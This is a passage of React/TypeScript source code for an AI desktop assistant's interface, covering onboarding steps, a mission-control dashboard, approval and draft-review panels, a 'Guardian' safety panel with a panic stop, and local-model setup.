          {step === 'Privacy + Memory' && <div className="settings-row"><label>Memory scope<select value={onboardingPrefs.memoryScope} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, memoryScope: e.target.value })}><option>personal</option><option>work</option><option>company</option><option>session</option><option>device</option></select></label><label>Approval mode<select value={onboardingPrefs.approvalMode} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, approvalMode: e.target.value })}><option>balanced</option><option>strict</option><option>demo</option></select></label><label>Monthly AI budget<input value={onboardingPrefs.monthlyBudget} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, monthlyBudget: e.target.value })} placeholder="0" /></label></div>}
          {step === 'Permissions' && <div><PermissionCards contextStatus={contextStatus} hotkeyStatus={hotkeyStatus} refreshContext={refreshContext} /><div className="callout"><strong>Current context check:</strong> {contextStatus}</div></div>}
          {step === 'Workspace' && <input className="wide-input" value={onboardingPrefs.workspace} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, workspace: e.target.value })} placeholder="/Users/you/Projects/AURA-workspace" />}
          {step === 'Local Model' && <ModelStatusPanel localModelStatus={localModelStatus} modelError={modelError} selectedLocalModel={selectedLocalModel} setSelected={(value) => setOnboardingPrefs({ ...onboardingPrefs, selectedLocalModel: value })} approveAndPullLocalModel={approveAndPullLocalModel} skip={() => useExistingOrSkipLocalModel('simple')} refresh={refreshKnowledge} modelPullState={modelPullState} />}
          {step === 'Workers' && <div className="settings-row"><label><input type="checkbox" checked={onboardingPrefs.codexBridge} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, codexBridge: e.target.checked })} /> Optional Codex bridge for code implementation</label><label><input type="checkbox" checked={onboardingPrefs.userAiHandoff} onChange={e => setOnboardingPrefs({ ...onboardingPrefs, userAiHandoff: e.target.checked })} /> Optional ChatGPT/Claude browser handoff</label></div>}
          {step === 'Voice + Hotkey' && <VoiceHotkeyPanel voiceStatus={voiceStatus} voiceEnabled={voiceEnabled} setVoiceEnabled={setVoiceEnabled} speak={speak} pushToTalk={pushToTalk} hotkeyStatus={hotkeyStatus} assistantName={assistantName} />}
          {step === 'Test First Task' && <TestAuraCards startAction={startAction} localReady={localReady} coreOnline={coreStatus === 'connected'} context={capturedContext} assistantName={assistantName} />}
        </section>

        <div className="persona-actions">
          <button onClick={() => setOnboardingStep(Math.max(0, onboardingStep - 1))} disabled={onboardingStep === 0}>Back</button>
          <button onClick={() => speak(copy.spoken || copy.body)}>Speak this step</button>
          <button onClick={() => setOnboardingStep(Math.min(ONBOARDING_STEPS.length - 1, onboardingStep + 1))} disabled={onboardingStep === ONBOARDING_STEPS.length - 1}>Continue</button>
          <button className="primary-button" onClick={completeOnboarding}>Enter command layer</button>
        </div>
      </main>
    </div>;
  }

  if (onboardingOpen) return renderOnboarding();

  return <div className={compactCommand ? 'app-shell compact-mode' : 'app-shell'}>
    <header className="topbar">
      <div>
        <div className="brand-row"><span className="brand-mark">{assistantName.slice(0, 1).toUpperCase()}</span><span>{assistantName}</span></div>
        <p>Personal AI operating layer. {assistantName} does the work; Guardian protects you.</p>
      </div>
      <div className="status-cluster">
        <StatusPill label={coreStatus === 'connected' ? 'AURA Core online' : coreStatus === 'starting' ? 'Starting AURA Core...' : 'AURA Core disconnected'} tone={coreStatus === 'connected' ? 'good' : coreStatus === 'starting' ? 'warn' : 'bad'} />
        <StatusPill label={`Guardian: ${guardianStatus?.status || 'Protected'}`} tone="good" />
        <StatusPill label={hotkeyStatus.ok ? 'Hotkey active' : 'Hotkey unavailable'} tone={hotkeyStatus.ok ? 'good' : 'bad'} />
        <StatusPill label={localReady ? 'Local model ready' : 'Local model setup'} tone={localReady ? 'good' : 'warn'} />
        <StatusPill label="Local-first mode" tone="privacy" />
      </div>
    </header>

    <section className="hero-command">
      <div className="orbital-status">
        <AssistantAvatar name={assistantName} mode={assistantMode} compact />
        <div>
          <div className="eyebrow">Mission Control</div>
          <h1>What should {assistantName} do?</h1>
          <p>{coreMessage}{coreError ? ` ${coreError}` : ''}</p>
        </div>
      </div>
      <div className={`caption-card home-caption ${assistantMode}`} aria-live="polite">
        <span>{assistantName} says</span>
        <strong>{caption}</strong>
      </div>
      <div className="command-bar">
        <button className="voice-button" onClick={pushToTalk} title="Push to talk">Voice</button>
        <input ref={commandRef} aria-label="command input" value={input} onChange={e => setInput(e.target.value)} placeholder={`Ask ${assistantName} to act on the current app, page, repo, or selection`} />
        <button className="primary-button" aria-label="run command" onClick={() => run()}>Run</button>
      </div>
      <div className="suggestions">
        {QUICK_ACTIONS.map(action => <button key={action} onClick={() => chooseCommand(action)}>{action}</button>)}
      </div>
      <div className="micro-status">
        <span>{voiceStatus}</span>
        <span>{hotkeyStatus.ok ? `${hotkeyStatus.accelerator} brings ${assistantName} forward.` : `Hotkey unavailable - ${hotkeyStatus.error || 'enable Accessibility permission for AURA/Electron in System Settings.'}`}</span>
      </div>
    </section>

    {coreStatus !== 'connected' && <div role="alert" className="repair-banner">
      <strong>{coreMessage}</strong>
      <span>{coreError || `Waiting for ${BACKEND_URL}`}</span>
      <button onClick={async () => { await refreshConnection(); await refreshKnowledge(); }}>Repair / retry</button>
      <button onClick={async () => setLogsPath(window.auraDesktop?.openLogs ? await window.auraDesktop.openLogs() : 'No desktop bridge. Start from Electron for logs.')}>Open logs</button>
    </div>}

    {needsUser && <div role="alert" className="approval-banner">
      <strong>{pendingApproval ? 'Approval required' : 'Action needed'}</strong>
      <span>{pendingApproval ? (toolApproval ? `Approve ${approvalState.step_name || approvalState.action_type || 'this action'}` : 'Review the draft, edit if needed, then approve paste-back.') : needsUser}{pendingRisk ? ` (${pendingRisk})` : ''}</span>
      {!pendingApproval && <button onClick={async () => { const r = await resumeRun(runId); setOut(JSON.stringify(r, null, 2)); await refreshRunState(runId); }}>Continue</button>}
    </div>}

    <main className="dashboard-grid">
      <section className="glass-panel context-panel">
        <PanelTitle eyebrow="AURA sees" title={capturedContext?.active_app || 'Unknown app'} />
        <div className="context-lines">
          <div><span>Window</span>{capturedContext?.window_title || '-'}</div>
          <div><span>URL</span>{shortText(currentUrl || capturedContext?.browser_url, 'No browser URL yet')}</div>
          <div><span>Workspace</span>{capturedContext?.workspace_hint || capturedContext?.project?.current_folder || '-'}</div>
          <div><span>Selection</span>{shortText(capturedContext?.input_text, 'No selected text captured')}</div>
        </div>
        <div className="panel-actions">
          <button onClick={refreshContext}>Refresh context</button>
          <button onClick={() => { setOnboardingStep(3); setOnboardingOpen(true); }}>Permission help</button>
        </div>
        <p className="helper-text">{contextStatus}</p>
      </section>

      <section className="glass-panel action-panel">
        <PanelTitle eyebrow="What I can do right now" title={contextKind(capturedContext) === 'none' ? 'Waiting for context' : 'Context-aware actions'} />
        <ContextActionCards cards={contextActions} startAction={startAction} coreOnline={coreStatus === 'connected'} contextKindValue={contextKind(capturedContext)} assistantName={assistantName} />
      </section>

      <section className="glass-panel guardian-card">
        <PanelTitle eyebrow="AURA Guardian" title={guardianStatus?.status || 'Protected'} />
        <div className="guardian-core">Protected</div>
        <p>Approval required for paste/send, risky shell, workflow replay, imports, exports, memory export, and paid actions.</p>
        <div className="guardian-grid">
          <span>Watching for secrets</span>
          <span>Secret redaction active</span>
          <span>Shell/file policy active</span>
          <span>Local-first mode active</span>
        </div>
        <button className="danger-button" onClick={() => panicStop(runId)} disabled={!runId}>Panic Stop</button>
      </section>

      <section className="glass-panel activity-panel">
        <PanelTitle eyebrow="Live activity" title={events.length ? 'AURA is working' : 'Examples until live events arrive'} />
        <Feed items={liveActivity} />
      </section>

      <section className="glass-panel savings-panel">
        <PanelTitle eyebrow="Time saved / work handled" title={`${conservativeMinutesSaved} min estimated`} />
        <div className="metric-grid">
          <Metric label="Runs" value={events.length || 0} />
          <Metric label="Approvals" value={approvalsHandled} />
          <Metric label="Workflows" value={workflowsReplayed} />
          <Metric label="Blocked" value={blockedCount} />
        </div>
        <p className="helper-text">Conservative estimate from completed run events, replayed workflows, and useful memory signals.</p>
      </section>
    </main>

    <nav className="panel-tabs">
      {PANELS.map(panel => <button key={panel} className={activePanel === panel ? 'active' : ''} onClick={() => setActivePanel(panel)}>{panel}</button>)}
    </nav>

    {activePanel === 'Mission' && <section className="panel-body">
      <TestAuraCards startAction={startAction} localReady={localReady} coreOnline={coreStatus === 'connected'} context={capturedContext} assistantName={assistantName} />
      <DraftReview runId={runId} pendingApproval={pendingApproval} toolApproval={toolApproval} approvalState={approvalState} generation={generation} pasteState={pasteState} draftText={draftText} setDraftText={setDraftText} feedback={feedback} setFeedback={setFeedback} approve={async () => { const r = await approveRun(runId, draftText); setOut(JSON.stringify(r, null, 2)); await refreshRunState(runId); }} retry={async () => { const r = await retryRun(runId, feedback); setOut(JSON.stringify(r, null, 2)); await refreshRunState(runId); }} reject={async () => { const r = await rejectRun(runId, feedback); setOut(JSON.stringify(r, null, 2)); await refreshRunState(runId); }} />
    </section>}

    {activePanel === 'Guardian' && <section className="panel-body">
      <GuardianPanel guardianStatus={guardianStatus} safety={safety} runId={runId} panic={() => panicStop(runId)} />
    </section>}

    {activePanel === 'Memory' && <section className="panel-body two-column">
      <div className="glass-panel"><PanelTitle eyebrow="Memory intelligence" title="Useful learning" /><Feed items={memoryFeed.length ? memoryFeed : [{ kind: 'empty', title: 'No memory updates yet', detail: 'AURA will show useful learning here after real tasks.' }]} /><button onClick={async () => { const r = await compactMemory('personal'); setOut(JSON.stringify(r, null, 2)); await refreshKnowledge(); }}>Compact personal memory</button></div>
      <div className="glass-panel"><PanelTitle eyebrow="Local model" title={localReady ? 'Ready' : 'Needs setup'} /><ModelStatusPanel localModelStatus={localModelStatus} modelError={modelError} selectedLocalModel={selectedLocalModel} setSelected={(value) => setOnboardingPrefs({ ...onboardingPrefs, selectedLocalModel: value })} approveAndPullLocalModel={approveAndPullLocalModel} skip={() => useExistingOrSkipLocalModel('simple')} refresh={refreshKnowledge} modelPullState={modelPullState} /></div>
    </section>}

    {activePanel === 'Workflows' && <section className="panel-body two-column">
      <div className="glass-panel"><PanelTitle eyebrow="Saved workflows" title={`${workflows.length} ready`} />{workflows.length ? workflows.map((workflow: any) => <div className="flow-row" key={workflow.workflow_id}><strong>{workflow.name}</strong><span>{workflow.command_template}</span><button onClick={async () => { const r = await runWorkflow(workflow.workflow_id, previewContext); setOut(JSON.stringify(r, null, 2)); if (r.run_id) { setRunId(r.run_id); await refreshRunState(r.run_id); } }}>Run</button></div>) : <p>No saved workflows yet.</p>}</div>
      <div className="glass-panel"><PanelTitle eyebrow="Workflow intelligence" title="Suggestions" />{workflowSuggestions.length ? workflowSuggestions.map((suggestion: any, index: number) => <div className="flow-row" key={`${suggestion.task_type}-${index}`}><strong>{suggestion.suggested_workflow_name || suggestion.name}</strong><span>{suggestion.command_template}</span><button onClick={async () => { const created = await createWorkflow({ name: suggestion.suggested_workflow_name || suggestion.name, description: suggestion.description || '', command_template: suggestion.command_template, trigger_type: suggestion.trigger_type || 'manual', trigger_value: suggestion.trigger_value || suggestion.pattern_key || '', source: suggestion.source || 'desktop_suggestion', confidence: suggestion.confidence || 0.5 }); setOut(JSON.stringify(created, null, 2)); await refreshKnowledge(); }}>Save</button></div>) : <p>AURA will suggest workflows after repeated useful actions.</p>}</div>
    </section>}

    {activePanel === 'Advanced' && <section className="panel-body">
      <details className="glass-panel"><summary>Raw run timeline</summary><ActionPanel events={events} /></details>
      <details className="glass-panel"><summary>Raw context JSON</summary><pre>{JSON.stringify(capturedContext, null, 2)}</pre></details>
      <details className="glass-panel"><summary>System, model, and backend internals</summary><p>Backend: {BACKEND_URL} / {coreStatus} / Flow: {launchFlow} / Session: {sessionState}</p><p>Logs: {logsPath || '-'}</p><button onClick={async () => setLogsPath(window.auraDesktop?.openLogs ? await window.auraDesktop.openLogs() : 'No desktop bridge.')}>Open logs folder</button><pre>{JSON.stringify({ profileStatus, costSummary, costModels, tools, devices, sessions, storage, out }, null, 2)}</pre></details>
    </section>}

    <footer className="footer-line">AURA Core: {coreStatus}. Guardian: protected. Wake word: not implemented yet. {assistantName} voice output: {voiceEnabled ? 'enabled' : 'optional'}.</footer>
  </div>;
}

function StatusPill(props: { label: string; tone: string }) {
  return <span className={`status-pill ${props.tone}`}>{props.label}</span>;
}

function AssistantAvatar(props: { name: string; mode: string; compact?: boolean }) {
  return <div className={props.compact ? `assistant-avatar compact ${props.mode}` : `assistant-avatar ${props.mode}`} aria-label={`${props.name} avatar`}>
    <div className="avatar-halo" />
    <div className="avatar-face">
      <span className="avatar-eye left" />
      <span className="avatar-eye right" />
      <span className="avatar-mouth" />
    </div>
    <div className="avatar-name">{props.name}</div>
  </div>;
}

function BoundaryList() {
  const items = ['Send email', 'Paste into apps', 'Delete or overwrite files', 'Run dangerous shell commands', 'Spend money', 'Export/import memory', 'Replay risky workflows', 'Push code'];
  return <div className="boundary-grid">{items.map((item) => <div className="boundary-item" key={item}><strong>{item}</strong><span>Approval required</span></div>)}</div>;
}

function GuardianPromise() {
  return <div className="guardian-promise">
    <div className="guardian-core">Protected</div>
    <div className="guardian-grid">
      <span>Blocked by default for destructive actions</span>
      <span>Watching for secrets</span>
      <span>Explains why approval is needed</span>
      <span>Redacts logs, timeline, and memory</span>
      <span>Paste/send policy active</span>
      <span>Panic stop supported</span>
    </div>
  </div>;
}

function PermissionCards(props: { contextStatus: string; hotkeyStatus: { ok: boolean; accelerator: string; error?: string }; refreshContext: () => void }) {
  const permissions = [
    { name: 'Accessibility', use: 'Bring AURA forward, capture app context, and control apps when approved.', never: 'Never controls apps silently.', status: props.hotkeyStatus.ok ? 'Likely enabled' : 'May be needed for hotkey/control' },
    { name: 'Automation', use: 'macOS may ask before AURA interacts with another app.', never: 'Never sends, pastes, or clicks through approval gates.', status: 'Requested per app by macOS' },
    { name: 'Microphone', use: 'Push-to-talk permission check and future voice input.', never: 'No always-listening wake word in this build.', status: 'Optional' },
    { name: 'Screen Recording', use: 'Visual context only when needed.', never: 'Never stores screenshots as memory without permission.', status: 'Optional until visual context is enabled' },
    { name: 'Browser handoff', use: 'Prepare ChatGPT/Claude prompts or read current URL when available.', never: 'Never claims page context it cannot see.', status: 'Optional' },
  ];
  return <div className="permission-grid">{permissions.map((permission) => <article className="permission-card" key={permission.name}>
    <span>{permission.status}</span>
    <h3>{permission.name}</h3>
    <p><strong>Why:</strong> {permission.use}</p>
    <p><strong>Never:</strong> {permission.never}</p>
  </article>)}<button onClick={props.refreshContext}>Check permissions / refresh context</button><p className="helper-text">{props.contextStatus}</p></div>;
}

function PanelTitle(props: { eyebrow: string; title: string }) {
  return <div className="panel-title"><span>{props.eyebrow}</span><h2>{props.title}</h2></div>;
}

function Metric(props: { label: string; value: any }) {
  return <div className="metric"><strong>{props.value}</strong><span>{props.label}</span></div>;
}

function Feed(props: { items: Array<{ kind?: string; title: string; detail?: string }> }) {
  return <div className="feed-list">{props.items.map((item, index) => <div className={`feed-item ${item.kind || ''}`} key={`${item.title}-${index}`}><div className="feed-dot" /><div><strong>{item.title}</strong><p>{item.detail}</p></div></div>)}</div>;
}

function ContextActionCards(props: { cards: Array<any>; startAction: (card: any) => void; coreOnline: boolean; contextKindValue: string; assistantName: string }) {
  return <div className="context-action-grid">{props.cards.map((card) => <article className="context-action-card" key={card.title}>
    <span>{props.coreOnline ? card.readiness : 'AURA Core must connect first'}</span>
    <h3>{card.title}</h3>
    <p>{card.detail}</p>
    {card.requires !== 'none' && props.contextKindValue !== card.requires && <p className="helper-text">{missingContextMessage(card.requires, props.assistantName)}</p>}
    <button onClick={() => props.startAction(card)}>{card.requires !== 'none' && props.contextKindValue !== card.requires ? 'Show setup needed' : 'Start'}</button>
  </article>)}</div>;
}

function ModelStatusPanel(props: { localModelStatus: any; modelError: string; selectedLocalModel: string; setSelected: (value: string) => void; approveAndPullLocalModel: () => void; skip: () => void; refresh: () => void; modelPullState: string }) {
  const hw = props.localModelStatus?.hardware || {};
  const ollama = props.localModelStatus?.ollama || {};
  const recommendation = props.localModelStatus?.recommendation || {};
  return <div className="model-grid">
    {props.modelError && <div className="callout bad">{props.modelError}</div>}
    <div className="glass-panel"><span>OS</span><strong>{hw.os || 'Unknown'}</strong></div>
    <div className="glass-panel"><span>Chip</span><strong>{hw.apple_silicon ? 'Apple Silicon' : hw.arch === 'x64' ? 'Intel' : hw.arch || 'Unknown'}</strong></div>
    <div className="glass-panel"><span>RAM</span><strong>{hw.ram_gb ? `${hw.ram_gb} GB` : 'Unknown'}</strong></div>
    <div className="glass-panel"><span>Ollama</span><strong>{ollama.installed ? 'Installed' : 'Missing'} / {ollama.running ? 'Running' : 'Stopped'}</strong></div>
    <div className="glass-panel wide"><span>Recommended local model</span><strong>{recommendation.model || props.selectedLocalModel}</strong><p>{recommendation.reason || 'AURA recommends a small private model until hardware detection completes.'}</p></div>
    <div className="glass-panel wide"><span>Local model status</span><strong>{props.localModelStatus?.summary || 'Checking local model runtime...'}</strong><input aria-label="local model name" value={props.selectedLocalModel} onChange={e => props.setSelected(e.target.value)} /><div className="panel-actions"><button onClick={props.approveAndPullLocalModel} disabled={!ollama.installed}>Approve Pull Model</button><button onClick={props.skip}>Skip for now</button><button onClick={props.refresh}>Refresh</button></div>{props.modelPullState && <pre>{props.modelPullState}</pre>}</div>
  </div>;
}

function VoiceHotkeyPanel(props: { voiceStatus: string; voiceEnabled: boolean; setVoiceEnabled: (value: boolean) => void; speak: (text: string) => void; pushToTalk: () => void; hotkeyStatus: { ok: boolean; accelerator: string; error?: string }; assistantName: string }) {
  return <div className="voice-grid">
    <div className="glass-panel"><span>Hotkey</span><strong>{props.hotkeyStatus.ok ? 'Hotkey active' : 'Hotkey unavailable'}</strong><p>{props.hotkeyStatus.ok ? `${props.hotkeyStatus.accelerator} opens compact command mode, focuses input, and refreshes context.` : `Hotkey unavailable - ${props.hotkeyStatus.error || 'enable Accessibility permission for AURA/Electron in System Settings.'}`}</p></div>
    <div className="glass-panel"><span>Voice output</span><strong>{props.voiceEnabled ? 'Enabled' : 'Optional'}</strong><label><input type="checkbox" checked={props.voiceEnabled} onChange={e => props.setVoiceEnabled(e.target.checked)} /> Speak guidance and status</label><button onClick={() => props.speak(`I'm ${props.assistantName}. I help you use your computer safely. Guardian is active.`)}>Speak intro</button></div>
    <div className="glass-panel"><span>Voice input</span><strong>Push-to-talk foundation</strong><p>{props.voiceStatus}</p><button onClick={props.pushToTalk}>Test microphone</button><p className="helper-text">Hey AURA wake word is not implemented yet.</p></div>
    <div className="glass-panel"><span>Always-on mode</span><strong>Coming later</strong><p>For now, start AURA when your Mac starts and use the hotkey or voice button.</p></div>
  </div>;
}

function TestAuraCards(props: { startAction: (card: any) => void; localReady: boolean; coreOnline: boolean; context: any; assistantName: string }) {
  const kind = contextKind(props.context);
  return <div className="launch-grid">{FIRST_USER_TESTS.map((card) => {
    const missing = card.requires === 'github' && kind !== 'github'
      ? missingContextMessage('github', props.assistantName)
      : card.requires === 'email' && kind !== 'email'
        ? missingContextMessage('email', props.assistantName)
        : '';
    return <article className="launch-card" key={card.title}><span>{props.coreOnline ? (missing || 'Ready') : 'Core must connect first'}</span><h3>{card.title}</h3><p><strong>Setup:</strong> {card.setup}</p><p><strong>Expected:</strong> {card.expected}</p><p><strong>Local model:</strong> {props.localReady ? 'ready' : 'optional / fallback'}</p><button onClick={() => props.startAction(card)}>{missing ? 'Show setup needed' : 'Start'}</button></article>;
  })}</div>;
}

function DraftReview(props: any) {
  return <div className="glass-panel draft-panel">
    <PanelTitle eyebrow="AURA is thinking" title={props.pendingApproval ? 'Approval required' : 'Draft review'} />
    <div className="context-lines">
      <div><span>Run</span>{props.runId || '-'}</div>
      <div><span>Approval</span>{props.approvalState.status || 'not requested'}</div>
      <div><span>Generation</span>{props.generation.provider ? `${props.generation.provider}${props.generation.model ? ` / ${props.generation.model}` : ''}` : '-'}</div>
      <div><span>Paste validation</span>{props.pasteState.target_validation_result || props.pasteState.target_validation || '-'}</div>
    </div>
    {!props.toolApproval && <textarea aria-label="draft editor" value={props.draftText} onChange={(e) => props.setDraftText(e.target.value)} rows={7} placeholder="Generated draft will appear here." />}
    {props.toolApproval && <pre>{JSON.stringify(props.approvalState.requested_args || {}, null, 2)}</pre>}
    <input aria-label="retry feedback" value={props.feedback} onChange={(e) => props.setFeedback(e.target.value)} placeholder="Optional retry feedback" />
    <div className="panel-actions"><button disabled={!props.runId || !props.pendingApproval} onClick={props.approve}>{props.toolApproval ? 'Approve Action' : 'Approve & Paste'}</button><button disabled={!props.runId || !props.pendingApproval || props.toolApproval} onClick={props.retry}>Retry</button><button disabled={!props.runId || !props.pendingApproval} onClick={props.reject}>Reject</button></div>
  </div>;
}

function GuardianPanel(props: { guardianStatus: any; safety: any[]; runId: string; panic: () => void }) {
  const events = asArray(props.guardianStatus?.events);
  return <div className="guardian-detail-grid">
    <div className="glass-panel"><PanelTitle eyebrow="Protection level" title="Protected" /><p>{props.guardianStatus?.summary || 'Guardian is watching for secrets, risky actions, unsafe paste/send, shell/file risk, and workflow replay risk.'}</p><div className="guardian-grid"><span>Approval required</span><span>Blocked by default</span><span>Watching for secrets</span><span>Local-first mode active</span><span>Paste/send policy active</span><span>Shell/file risk policy active</span></div><button className="danger-button" onClick={props.panic} disabled={!props.runId}>Panic Stop</button></div>
    <div className="glass-panel"><PanelTitle eyebrow="Recent blocked/actions" title={`${events.length + props.safety.length} signals`} /><Feed items={(events.length ? events : props.safety.slice(-8)).map((event: any) => ({ title: event.summary || event.message || event.kind || event.type || 'Guardian event', detail: event.explanation || event.action || event.step_id || event.risk || 'Protection state updated.' }))} /></div>
  </div>;
}
